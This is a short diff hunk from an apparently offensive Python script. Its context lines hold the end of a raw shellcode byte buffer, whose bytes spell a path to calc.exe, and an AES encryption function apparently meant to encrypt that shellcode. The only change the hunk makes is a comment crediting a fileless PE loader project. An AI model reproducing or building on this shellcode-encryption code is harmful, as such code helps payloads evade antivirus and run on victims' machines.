@@ -45,6 +45,8 @@ else:
     buf += b"\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x63"
     buf += b"\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
+# From https://github.com/SaadAhla/FilelessPELoader
+
 def AESencrypt(plaintext, key):
     k = hashlib.sha256(KEY).digest()
     iv = 16 * b'\x00'
